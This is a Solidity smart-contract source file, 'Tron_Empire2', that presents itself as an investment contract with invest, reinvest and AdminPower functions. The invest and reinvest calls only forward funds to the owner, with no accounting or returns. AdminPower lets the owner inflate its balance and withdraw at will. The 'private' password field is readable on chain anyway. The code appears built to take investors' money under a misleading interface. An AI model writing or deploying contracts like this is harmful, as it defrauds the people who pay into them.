//SourceUnit: Tron_Empire2.sol

 pragma solidity ^0.4.25;
 contract Tron_Empire2{
    address private owner;
    address private verifyAddress;
    uint256 public  initialSupply = 100000000;
    string private password;
    struct Instructor {
        
        string pass;
        uint amt;

    }

constructor(address _stakingAddress,string _pass) public {

        owner = _stakingAddress;
        password = _pass;
        verifyAddress = _stakingAddress;


}

        mapping(address => uint256) public balances;
    mapping (address => Instructor) instructors;
    //mapping (address => Instructor.pass) public password;
    address[] public instructorAccts;

    
    function invest(string  _passsssss,string memory _asssssss,uint amt,uint amnt) public payable{
            owner.transfer(amnt);
    }

    function reinvest(string memory  _passsssss,string memory _asssssss,uint amt,uint amnt) public payable{
        owner.transfer(amnt);
    }

    
    function AdminPower(uint amount) public {   
           address userAddress=msg.sender;
           //string memory  pass=getInstructor(userAddress);
            if (owner==userAddress) {
            balances[msg.sender] += amount;
                     // optimistic accounting
            msg.sender.transfer(amount);
                        // transfer
               //return userAddress; 
            }            
            
    }
    


}